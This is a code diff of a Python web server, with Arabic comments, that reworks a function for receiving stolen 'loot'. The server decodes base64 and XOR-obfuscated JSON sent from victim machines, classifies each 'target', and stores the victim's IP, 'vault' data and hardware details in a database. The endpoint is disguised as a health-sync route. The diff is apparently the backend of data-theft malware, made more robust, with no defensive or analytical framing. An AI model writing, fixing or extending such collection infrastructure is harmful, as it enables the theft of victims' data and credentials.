@@ -71,35 +71,44 @@ def boot_system():
 # --- 4. محرك المعالجة الخلفية (The Black Box) ---
 def process_incoming_loot(raw_bytes: bytes, ip: str):
     try:
-        # تنظيف البيانات ومعالجة مشاكل الـ Base64 (حل مشكلة الـ Error)
+        # 1. تنظيف النص القادم
         raw_str = raw_bytes.decode('utf-8', errors='ignore').strip().replace(' ', '+')
         
-        # تصحيح الـ Padding تلقائياً
-        missing_padding = len(raw_str) % 4
-        if missing_padding:
-            raw_str += '=' * (4 - missing_padding)
-            
-        decoded_bytes = base64.b64decode(raw_str)
-        decoded = json.loads(decoded_bytes.decode('utf-8'))
-        
-        target_class = SovereignAI.evaluate_target(decoded)
-        
-        # تشفير مزدوج قبل الحفظ
-        secure_loot = base64.b64encode(xor_cipher(json.dumps(decoded)).encode()).decode()
-        secure_vault = base64.b64encode(xor_cipher(json.dumps(decoded.get('vault', {}))).encode()).decode()
+        # 2. فك Base64 (بمحاولات متعددة)
+        decoded_data = None
+        for _ in range(2): 
+            try:
+                missing_padding = len(raw_str) % 4
+                if missing_padding: raw_str += '=' * (4 - missing_padding)
+                decoded_data = base64.b64decode(raw_str).decode('utf-8')
+                break
+            except: raw_str = raw_str.replace('-', '+').replace('_', '/') # تحويل URL-safe
 
+        if not decoded_data: raise Exception("Base64 Failed")
+        
+        # 3. محاولة قراءة الـ JSON (سواء كان XOR أو عادي)
+        try:
+            data = json.loads(decoded_data) # إذا كان JSON عادي
+        except:
+            data = json.loads(xor_cipher(decoded_data)) # إذا كان مشفر XOR
+
+        target_class = SovereignAI.evaluate_target(data)
+        
+        # 4. التخزين (احفظ النسخة الخام والنسخة المشفرة)
+        secure_loot = base64.b64encode(xor_cipher(json.dumps(data)).encode()).decode()
+        
         conn = get_db_conn()
         cur = conn.cursor()
         cur.execute("""
             INSERT INTO sovereign_omega_loot (target_id, gift_tag, ip_address, encrypted_loot, vault_data, target_class, metadata)
             VALUES (%s, %s, %s, %s, %s, %s, %s)
-        """, (decoded.get('tid'), decoded.get('tag'), ip, secure_loot, secure_vault, target_class, json.dumps(decoded.get('hw'))))
+        """, (data.get('tid'), data.get('tag'), ip, secure_loot, json.dumps(data.get('vault', {})), target_class, json.dumps(data.get('hw'))))
         conn.commit()
         cur.close()
         conn.close()
-        logger.info(f"✅ Target Captured: {ip} | Class: {target_class}")
+
     except Exception as e:
-        logger.error(f"💀 Drop Error: {str(e)}")
+        logger.error(f"💀 CRITICAL_FAILURE: {str(e)}")
 
 # --- 5. البوابات ---
 @app.post("/api/v1/sys/health/sync")
